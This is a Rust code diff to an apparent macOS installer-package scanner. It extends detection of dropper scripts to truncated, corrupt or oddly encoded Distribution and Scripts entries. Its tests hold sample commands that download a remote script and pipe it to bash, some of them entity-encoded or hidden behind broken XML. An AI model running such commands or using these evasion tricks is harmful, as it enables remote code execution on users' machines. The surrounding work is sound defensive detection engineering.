@@ -139,9 +139,10 @@ fn scan_scripts_entry(
     findings: &mut ScriptFindings,
 ) -> Result<(), RuleOutcome> {
     // An entry we can't reach (bounded read stopped short) is
-    // unreadable, not absent.
-    let raw =
-        xar::read_entry(content, archive, entry, limits).map_err(|_| RuleOutcome::NotApplicable)?;
+    // unreadable, not absent. A partial bzip2 read is scanned, then reported
+    // unreadable below.
+    let (raw, gap) = xar::read_entry_partial(content, archive, entry, limits)
+        .map_err(|_| RuleOutcome::NotApplicable)?;
 
     // Scripts is normally gzip-wrapped cpio; if not gzip, `read_entry`
     // already undid the heap encoding.
@@ -151,12 +152,13 @@ fn scan_scripts_entry(
     };
 
     let Some(members) = cpio::parse(&archive_bytes, &cpio::CpioLimits::default()) else {
-        // Something is in there, but not in a shape we can read.
+        // Something is in there, but not in a shape we can read: scan it raw.
+        let label = format!("{}!{}", ctx.path.display(), entry.path);
+        findings.scan(label, archive_bytes, "install scripts (unparsed)");
         return Err(RuleOutcome::NotApplicable);
     };
-    if !members.is_complete() {
-        return Err(RuleOutcome::NotApplicable);
-    }
+    // Members that did parse are scanned even when the archive is cut short.
+    let complete = members.is_complete() && gap.is_none();
 
     for member in &members.entries {
         if !member.is_regular_file() || member.data.is_empty() {
@@ -169,7 +171,11 @@ fn scan_scripts_entry(
             &format!("install script {}", member.name),
         );
     }
-    Ok(())
+    if complete {
+        Ok(())
+    } else {
+        Err(RuleOutcome::NotApplicable)
+    }
 }
 
 /// Extracts the installer JavaScript from `Distribution` XML: `<script>`
@@ -179,11 +185,38 @@ fn scan_scripts_entry(
 /// `NotApplicable` on malformed XML, an unterminated `<script>`, or any
 /// document we could not read the way Installer's parser would (see
 /// [`check_faithfully_readable`], §11.8).
+#[cfg(test)]
 fn distribution_js(raw: &[u8]) -> Result<Vec<u8>, RuleOutcome> {
     let decoded = utf16_to_utf8(raw);
-    let xml_bytes = decoded.as_deref().unwrap_or(raw);
-    check_faithfully_readable(xml_bytes)?;
-    let mut pieces: Vec<String> = Vec::new();
+    let mut pieces = Vec::new();
+    distribution_pieces(
+        decoded.as_deref().unwrap_or(raw),
+        decoded.is_some(),
+        &mut pieces,
+    )?;
+    Ok(join_pieces(&pieces))
+}
+
+/// Non-blank `pieces` joined with `\n`.
+fn join_pieces(pieces: &[String]) -> Vec<u8> {
+    let kept: Vec<&str> = pieces
+        .iter()
+        .map(String::as_str)
+        .filter(|p| !p.trim().is_empty())
+        .collect();
+    kept.join("\n").into_bytes()
+}
+
+/// The walker behind [`distribution_js`], over UTF-8 or 8-bit bytes;
+/// `transcoded` says they came out of [`utf16_to_utf8`]. Pieces collected
+/// before a failure stay in `pieces`; an unterminated `<script>` contributes
+/// its body so far.
+fn distribution_pieces(
+    xml_bytes: &[u8],
+    transcoded: bool,
+    pieces: &mut Vec<String>,
+) -> Result<(), RuleOutcome> {
+    check_faithfully_readable(xml_bytes, transcoded)?;
     let mut saw_element = false;
     let mut scanner = xml::Scanner::new(xml_bytes);
     loop {
@@ -197,13 +230,16 @@ fn distribution_js(raw: &[u8]) -> Result<Vec<u8>, RuleOutcome> {
             }) => {
                 saw_element = true;
                 for (_, value) in xml::attrs(attrs) {
-                    check_entities(value)?;
                     pieces.push(xml::decode_entities(value));
+                    check_entities(value)?;
                 }
                 if name == "script" && !self_closing {
-                    let raw = scanner
-                        .raw_until_close("script")
-                        .ok_or(RuleOutcome::NotApplicable)?;
+                    let Some(raw) = scanner.raw_until_close("script") else {
+                        if let Ok(body) = script_body_texts(scanner.rest()) {
+                            pieces.extend(body);
+                        }
+                        return Err(RuleOutcome::NotApplicable);
+                    };
                     pieces.extend(script_body_texts(raw)?);
                 }
             }
@@ -213,8 +249,7 @@ fn distribution_js(raw: &[u8]) -> Result<Vec<u8>, RuleOutcome> {
     if !saw_element {
         return Err(RuleOutcome::NotApplicable);
     }
-    pieces.retain(|p| !p.trim().is_empty());
-    Ok(pieces.join("\n").into_bytes())
+    Ok(())
 }
 
 /// Transcodes UTF-16 (BOM, or BOM-less starting `<\0` / `\0<`) to UTF-8
@@ -299,8 +334,12 @@ fn script_body_texts(raw: &[u8]) -> Result<Vec<String>, RuleOutcome> {
 /// `NotApplicable` unless the document would be read by Installer's parser as
 /// the characters we are scanning: it must start with `<` (after an optional
 /// UTF-8 BOM and whitespace), declare no unsupported `encoding`, and declare
-/// no entities.
-fn check_faithfully_readable(b: &[u8]) -> Result<(), RuleOutcome> {
+/// no entities. `transcoded` says `b` came out of [`utf16_to_utf8`]: a UTF-16
+/// label is accepted only then, and an 8-bit document must contain no NUL.
+fn check_faithfully_readable(b: &[u8], transcoded: bool) -> Result<(), RuleOutcome> {
+    if !transcoded && b.contains(&0) {
+        return Err(RuleOutcome::NotApplicable);
+    }
     let b = b.strip_prefix(b"\xEF\xBB\xBF".as_slice()).unwrap_or(b);
     let start = b
         .iter()
@@ -327,15 +366,8 @@ fn check_faithfully_readable(b: &[u8]) -> Result<(), RuleOutcome> {
             let ok = value.as_deref().is_some_and(|v| {
                 matches!(
                     v,
-                    "utf-8"
-                        | "utf8"
-                        | "us-ascii"
-                        | "ascii"
-                        | "iso-8859-1"
-                        | "latin-1"
-                        | "latin1"
-                        | "utf-16"
-                )
+                    "utf-8" | "utf8" | "us-ascii" | "ascii" | "iso-8859-1" | "latin-1" | "latin1"
+                ) || (transcoded && matches!(v, "utf-16" | "utf-16le" | "utf-16be"))
             });
             if !ok {
                 return Err(RuleOutcome::NotApplicable);
@@ -418,11 +450,53 @@ fn scan_distribution_entry(
     limits: &xar::XarLimits,
     findings: &mut ScriptFindings,
 ) -> Result<(), RuleOutcome> {
-    let raw =
-        xar::read_entry(content, archive, entry, limits).map_err(|_| RuleOutcome::NotApplicable)?;
-    let js = distribution_js(&raw)?;
+    let (raw, gap) = xar::read_entry_partial(content, archive, entry, limits)
+        .map_err(|_| RuleOutcome::NotApplicable)?;
+    // The `.js` suffix makes `classify_text` treat even a short buffer as script.
+    let label = format!("{}!{}.js", ctx.path.display(), entry.path);
+    let decoded = utf16_to_utf8(&raw);
+    let text = decoded.as_deref().unwrap_or(&raw);
+    let mut pieces = Vec::new();
+    match distribution_pieces(text, decoded.is_some(), &mut pieces) {
+        Ok(()) => {
+            scan_distribution_text(label, join_pieces(&pieces), findings);
+            // A partial read is evidence, not a clean read: findings stay,
+            // the entry is reported unreadable.
+            if gap.is_some() {
+                return Err(RuleOutcome::NotApplicable);
+            }
+            Ok(())
+        }
+        Err(_) => {
+            // Bytes we hold but could not parse are still evidence: scan what
+            // the walker got, the raw text, and the raw text entity-decoded
+            // (each once), then report the entry unreadable.
+            let mut all = pieces;
+            let lossy = String::from_utf8_lossy(text).into_owned();
+            let entity_decoded = xml::decode_entities(text);
+            let mut extras = vec![lossy, entity_decoded];
+            if text.contains(&0) {
+                // ASCII-range UTF-16 behind an 8-bit declaration reads as text
+                // once NULs are dropped, at either byte order and alignment.
+                let stripped: Vec<u8> = text.iter().copied().filter(|c| *c != 0).collect();
+                extras.push(String::from_utf8_lossy(&stripped).into_owned());
+                extras.push(xml::decode_entities(&stripped));
+            }
+            for extra in extras {
+                if !all.contains(&extra) {
+                    all.push(extra);
+                }
+            }
+            scan_distribution_text(label, join_pieces(&all), findings);
+            Err(RuleOutcome::NotApplicable)
+        }
+    }
+}
+
+/// Records the interpreter launch and content-rule findings in `js`.
+fn scan_distribution_text(label: String, js: Vec<u8>, findings: &mut ScriptFindings) {
     if js.is_empty() {
-        return Ok(());
+        return;
     }
     if let Some(name) = launched_interpreter(&String::from_utf8_lossy(&js)) {
         findings.add(
@@ -430,10 +504,7 @@ fn scan_distribution_entry(
             format!("distribution script: system.run launches an interpreter ({name})"),
         );
     }
-    // The `.js` suffix makes `classify_text` treat even a short buffer as script.
-    let label = format!("{}!{}.js", ctx.path.display(), entry.path);
     findings.scan(label, js, "distribution script");
-    Ok(())
 }
 
 /// Shells and script interpreters that `system.run` should not be launching
@@ -722,11 +793,19 @@ mod tests {
 
     #[test]
     fn an_unsupported_declared_encoding_is_not_applicable() {
-        for decl in ["UTF-16", "utf-8", "US-ASCII", "ISO-8859-1", "Latin1"] {
+        for decl in ["utf-8", "US-ASCII", "ISO-8859-1", "Latin1"] {
             let doc = format!(r#"<?xml version="1.0" encoding="{decl}"?><a/>"#);
             assert!(distribution_js(doc.as_bytes()).is_ok(), "{decl}");
         }
-        for decl in ["UTF-7", "Shift_JIS", "EBCDIC-US", "x-mac-roman"] {
+        for decl in [
+            "UTF-7",
+            "Shift_JIS",
+            "EBCDIC-US",
+            "x-mac-roman",
+            "UTF-16",
+            "utf-16le",
+            "UTF-16BE",
+        ] {
             let doc = format!(r#"<?xml version="1.0" encoding="{decl}"?><a/>"#);
             assert!(not_applicable(doc.as_bytes()), "{decl}");
         }
@@ -946,17 +1025,336 @@ mod tests {
         }
     }
 
-    /// A bzip2-compressed Distribution (as in real packages) is not checked.
-    #[test]
-    fn a_compressed_distribution_in_a_package_is_not_applicable() {
-        let blob = b"BZh91AY&SY\x01\x02\x03\x04 junk";
+    /// A xar whose only entry is a `Distribution` holding `blob`, labelled bzip2.
+    fn bzip2_distribution_pkg(blob: &[u8]) -> Vec<u8> {
         let toc = format!(
             r#"<file id="1"><name>Distribution</name><type>file</type><data><offset>0</offset><length>{n}</length><size>{n}</size><encoding style="application/x-bzip2"/></data></file>"#,
             n = blob.len()
         );
         let mut bytes = xar::toc_xar_bytes(&toc);
         bytes.extend_from_slice(blob);
-        let c = ctx("compressed.pkg", &bytes);
+        bytes
+    }
+
+    /// Real bzip2 (`testdata/bzip2/distribution_dropper.in`) of a dropper Distribution.
+    #[test]
+    fn a_bzip2_distribution_in_a_package_is_checked() {
+        let blob = include_bytes!("../../testdata/bzip2/distribution_dropper.in");
+        let c = ctx("bz.pkg", &bzip2_distribution_pkg(blob));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the decoded Distribution scores");
+        assert!(
+            signal.description.starts_with("distribution script:"),
+            "{}",
+            signal.description
+        );
+        assert!(!c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// A bzip2 `Distribution` missing its trailer still reads in libxar, so
+    /// Installer runs it. The decoded part is scanned and the gap reported.
+    #[test]
+    fn a_trailerless_bzip2_dropper_distribution_scores_and_marks_incomplete() {
+        let full = include_bytes!("../../testdata/bzip2/distribution_dropper.in");
+        let cut = crate::bzip2::cut_trailer(full);
+        assert!(cut.len() < full.len());
+        let bytes = bzip2_distribution_pkg(cut);
+
+        let c = ctx("cut.pkg", &bytes);
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the decoded part scores");
+        assert!(
+            signal.description.starts_with("distribution script:"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+
+        let c = ctx("cut.pkg", &bytes);
+        let rules: Vec<Box<dyn Rule>> = vec![Box::new(InstallerScriptRule)];
+        let r = crate::scan::scan_context(&c, &rules);
+        assert_eq!(r.completeness, crate::model::ScanCompleteness::Partial);
+        assert_eq!(r.signals.len(), 1);
+    }
+
+    /// Same cut, nothing found: unreadable, never clean.
+    #[test]
+    fn a_trailerless_bzip2_benign_distribution_is_not_applicable() {
+        let full = include_bytes!("../../testdata/bzip2/distribution_ordinary.in");
+        let cut = crate::bzip2::cut_trailer(full);
+        let c = ctx("cut.pkg", &bzip2_distribution_pkg(cut));
+        assert!(matches!(
+            InstallerScriptRule.evaluate(&c),
+            Err(RuleOutcome::NotApplicable)
+        ));
+        // Intact, it is clean.
+        let c = ctx("ok.pkg", &bzip2_distribution_pkg(full));
+        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
+    }
+
+    /// A wrong block CRC does not hide the decoded bytes: libxar yields them
+    /// without checking, so they are scanned and the entry reported unreadable.
+    #[test]
+    fn a_bzip2_distribution_with_a_wrong_crc_is_scanned_and_marked_incomplete() {
+        let mut blob = include_bytes!("../../testdata/bzip2/distribution_dropper.in").to_vec();
+        blob[10] ^= 0x80; // block CRC
+        let c = ctx("bad.pkg", &bzip2_distribution_pkg(&blob));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the decoded block scores");
+        assert!(signal.description.starts_with("distribution script:"));
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// Asserts `pkg` scores as a dropper Distribution, is marked incomplete
+    /// and scans as Partial with that signal.
+    fn assert_scored_but_partial(pkg: &[u8]) {
+        let c = ctx("d.pkg", pkg);
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the decoded bytes score");
+        assert!(
+            signal.description.starts_with("distribution script:"),
+            "{}",
+            signal.description
+        );
+        assert!(
+            signal
+                .description
+                .contains("launches an interpreter (bash)"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+
+        let c = ctx("d.pkg", pkg);
+        let rules: Vec<Box<dyn Rule>> = vec![Box::new(InstallerScriptRule)];
+        let r = crate::scan::scan_context(&c, &rules);
+        assert_eq!(r.completeness, crate::model::ScanCompleteness::Partial);
+        assert_eq!(r.signals.len(), 1);
+    }
+
+    /// Valid stream, but over the entry budget: the in-budget prefix holds the dropper.
+    #[test]
+    fn a_bzip2_distribution_over_budget_is_scanned_and_marked_incomplete() {
+        let blob = include_bytes!("../../testdata/bzip2/distribution_big.in");
+        assert_scored_but_partial(&bzip2_distribution_pkg(blob));
+    }
+
+    /// Valid CRCs and no trailer, then a tail that breaks the XML: the raw
+    /// text is scanned.
+    #[test]
+    fn a_trailerless_bzip2_distribution_with_a_junk_tail_is_scanned() {
+        let full = include_bytes!("../../testdata/bzip2/distribution_junk_tail.in");
+        let cut = crate::bzip2::cut_trailer(full);
+        assert_scored_but_partial(&bzip2_distribution_pkg(cut));
+    }
+
+    #[test]
+    fn a_wrong_crc_trailerless_bzip2_distribution_is_scanned() {
+        let full = include_bytes!("../../testdata/bzip2/distribution_dropper.in");
+        let mut cut = crate::bzip2::cut_trailer(full).to_vec();
+        cut[10] ^= 0x01;
+        assert_scored_but_partial(&bzip2_distribution_pkg(&cut));
+    }
+
+    /// The benign counterpart of the junk-tail case: nothing to report.
+    #[test]
+    fn a_trailerless_benign_distribution_with_a_junk_tail_is_not_applicable() {
+        let full = include_bytes!("../../testdata/bzip2/distribution_ordinary_junk_tail.in");
+        let cut = crate::bzip2::cut_trailer(full);
+        let c = ctx("d.pkg", &bzip2_distribution_pkg(cut));
+        assert!(matches!(
+            InstallerScriptRule.evaluate(&c),
+            Err(RuleOutcome::NotApplicable)
+        ));
+    }
+
+    /// Scores `dist` (stored, so fully read) as a dropper that is unparseable
+    /// but still reported: signal with both indicators, marked incomplete.
+    fn assert_fallback_scores(dist: &[u8]) {
+        let c = ctx("f.pkg", &pkg_with_distribution(dist));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the fallback scores");
+        assert!(
+            signal
+                .description
+                .contains("launches an interpreter (bash)"),
+            "{}",
+            signal.description
+        );
+        assert!(
+            signal.description.contains("download piped to a shell"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// Entity-encoded dropper in an attribute, cut off, with an XML-breaking
+    /// tail: the raw text shows `&#99;url`, only the decoded form matches.
+    #[test]
+    fn an_entity_encoded_dropper_behind_a_junk_tail_is_scored() {
+        let full = include_bytes!("../../testdata/bzip2/distribution_entity_junk_tail.in");
+        let cut = crate::bzip2::cut_trailer(full);
+        let c = ctx("e.pkg", &bzip2_distribution_pkg(cut));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the decoded form scores");
+        assert!(signal.description.contains("download piped to a shell"));
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    #[test]
+    fn an_entity_encoded_script_behind_a_junk_tail_is_scored() {
+        let mut dist = br#"<a><script>system.run(&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;&#99;url -fsSL https://example-cdn.invalid/a.sh | /bin/bash&quot;);</script></a>"#.to_vec();
+        dist.extend_from_slice(&[b'\n'; 50]);
+        dist.extend_from_slice(&[b'<'; 300]);
+        assert_fallback_scores(&dist);
+    }
+
+    #[test]
+    fn an_unterminated_script_holding_a_dropper_is_scored() {
+        assert_fallback_scores(
+            br#"<a><script>system.run("/bin/bash", "-c", "curl -fsSL https://example-cdn.invalid/a.sh | /bin/bash");"#,
+        );
+    }
+
+    /// The false-positive side: an unparseable but ordinary Distribution
+    /// stays NotApplicable, with no signal.
+    #[test]
+    fn an_unparseable_benign_distribution_is_not_applicable() {
+        let body = "<title>Example App</title><script>function onConclusion() { system.run('unload.sh'); }</script>\
+                    <readme file=\"r.html\"/>";
+        for dist in [
+            format!(r#"<?xml version="1.0" encoding="macintosh"?><i>{body}</i>"#),
+            format!(r#"<!DOCTYPE i [<!ENTITY t "Example">]><i>{body}</i>"#),
+        ] {
+            let c = ctx("b.pkg", &pkg_with_distribution(dist.as_bytes()));
+            assert!(
+                matches!(
+                    InstallerScriptRule.evaluate(&c),
+                    Err(RuleOutcome::NotApplicable)
+                ),
+                "{dist}"
+            );
+        }
+    }
+
+    #[test]
+    fn utf16_declarations_are_accepted_on_real_utf16() {
+        for (decl, big_endian, bom) in [
+            ("UTF-16", false, true),
+            ("UTF-16LE", false, false),
+            ("UTF-16BE", true, false),
+            ("UTF-16", true, true),
+        ] {
+            let doc = format!(
+                r#"<?xml version="1.0" encoding="{decl}"?><a><script>system.run("/bin/bash", "-c", "x");</script></a>"#
+            );
+            let out = distribution_js(&utf16(&doc, big_endian, bom)).expect(decl);
+            let out = String::from_utf8_lossy(&out);
+            assert!(out.contains(r#"system.run("/bin/bash""#), "{decl}: {out}");
+        }
+    }
+
+    /// ASCII declaration, then UTF-16 content: libxml2 switches decoder at the declaration.
+    fn mixed_utf16_docs() -> Vec<Vec<u8>> {
+        let rest = r#"?><i><script>system.run("/bin/bash","-c","curl -fsSL https://example.invalid/a.sh | /bin/bash");</script></i>"#;
+        [("UTF-16LE", false), ("UTF-16BE", true)]
+            .into_iter()
+            .map(|(decl, big_endian)| {
+                let mut doc = format!(r#"<?xml version="1.0" encoding="{decl}""#).into_bytes();
+                doc.extend(utf16(rest, big_endian, false));
+                doc
+            })
+            .collect()
+    }
+
+    #[test]
+    fn utf16_content_behind_an_8bit_declaration_is_not_applicable() {
+        for doc in mixed_utf16_docs() {
+            assert!(not_applicable(&doc));
+        }
+        assert!(not_applicable(b"<a>\0</a>"));
+    }
+
+    #[test]
+    fn utf16_content_behind_an_8bit_declaration_is_scanned_and_marked_incomplete() {
+        for doc in mixed_utf16_docs() {
+            let c = ctx("m.pkg", &pkg_with_distribution(&doc));
+            let signal = InstallerScriptRule
+                .evaluate(&c)
+                .expect("evaluates")
+                .expect("the NUL-stripped text scores");
+            assert!(
+                signal
+                    .description
+                    .contains("system.run launches an interpreter (bash)"),
+                "{}",
+                signal.description
+            );
+            assert!(c.marked_incomplete("installer-script-suspicious"));
+        }
+    }
+
+    /// A stored `Scripts` entry that is not cpio.
+    fn pkg_with_scripts(blob: &[u8]) -> Vec<u8> {
+        let toc = format!(
+            r#"<file id="1"><name>Scripts</name><type>file</type><data><offset>0</offset><length>{n}</length><size>{n}</size><encoding style="application/octet-stream"/></data></file>"#,
+            n = blob.len()
+        );
+        let mut bytes = xar::toc_xar_bytes(&toc);
+        bytes.extend_from_slice(blob);
+        bytes
+    }
+
+    #[test]
+    fn unparsable_scripts_with_a_dropper_are_scored_and_marked_incomplete() {
+        let blob = b"#!/bin/sh\ncurl -fsSL http://198.51.100.5/s | sh\n";
+        let c = ctx("s.pkg", &pkg_with_scripts(blob));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the raw text scores");
+        assert!(
+            signal
+                .description
+                .starts_with("install scripts (unparsed):"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    #[test]
+    fn unparsable_scripts_with_nothing_scoring_are_not_applicable() {
+        let c = ctx(
+            "s.pkg",
+            &pkg_with_scripts(b"not a gzip or cpio archive at all"),
+        );
+        assert!(matches!(
+            InstallerScriptRule.evaluate(&c),
+            Err(RuleOutcome::NotApplicable)
+        ));
+    }
+
+    /// Undecodable bytes with nothing scoring are unreadable, not clean.
+    #[test]
+    fn an_undecodable_bzip2_distribution_is_not_applicable() {
+        let c = ctx(
+            "bad.pkg",
+            &bzip2_distribution_pkg(b"BZh91AY&SY\x01\x02\x03\x04 junk"),
+        );
         assert!(matches!(
             InstallerScriptRule.evaluate(&c),
             Err(RuleOutcome::NotApplicable)
